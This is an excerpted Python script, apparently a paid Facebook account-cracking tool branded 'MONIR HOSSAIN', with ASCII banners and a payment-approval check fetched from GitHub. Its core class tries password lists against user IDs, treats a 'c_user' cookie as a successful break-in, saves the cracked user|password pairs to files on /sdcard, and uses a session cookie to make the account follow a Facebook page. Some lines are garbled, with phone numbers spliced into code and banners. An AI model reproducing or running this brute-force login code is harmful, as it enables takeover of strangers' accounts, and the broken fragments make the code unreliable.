...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801886019617?text=' + tks)

        

    r1=requests.get("https://github.com/MONIR-HOSSAIN221/KING-OF/blob/main/Afroveal9.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄MONIR᭄•───────────────────────────────────────•༄HOSSAIN᭄")
        print ("                   \033[1;94mGIVE ME 150 TK FOR APROVAL MONIR")     
...
logo="""
        ...
        \033[1;92m༄MONIR᭄•───────────────────────────────────────•༄HOSSAIN᭄
                \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
                \033[1;93m▇▇➣    \033[1;95mAUTHOR   : MONIR             \033[1;93m▇▇
                \033[1;93m▇▇➣    \033[1;94mGITHUB   : MONIR-SOSSAIN221           \033[1;93m▇▇
                \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MONIR HOSSAIN   \033[1;93m▇▇
                \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801886019617     \033[1;93m▇▇
                \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
                \033[1;93m▇▇➣    \033[1;94mGIVE ME 150 tk FOR APRVAL     \033[1;93m▇▇
                \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
        \033[1;92m༄𝑟MONIR᭄•───────────────────────────────────────•༄HOSSAIN᭄
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/MONIR-HOSSAIN-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/MONIR-HOSSAIN-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : MONIR")
			print ('\033[1;92m༄MONIR᭄•───────────────────────────────────────•༄HOSSAIN᭄')
			key = input(" [*] Choose : ")
			print ('༄MONIR᭄•───────────────────────────────────────•༄HOSSAIN᭄')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[MONIR-HOSSAIN]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MONIR-HOSSAIN-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/MONIR-HOSSAIN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/MONIR-HOSSAIN_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://www.facebook.com/qwetuwqwrtyyyrewwqedddgtreertt?mibextid=ZbWKwL', cookies={'cookie': coki}).text, 'html.parser')
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.s8801865272669stem("clear")

            print(logo)

            print("\033[1;32m      Dont Forget Allah😊 \033[1;37m")

            print("༄MO8801886019617NIR᭄•───────────────────────────────────────•༄HOSSAIN᭄")
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+01886019617")
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/qwetuwqwrtyyyrewwqedddgtreertt")
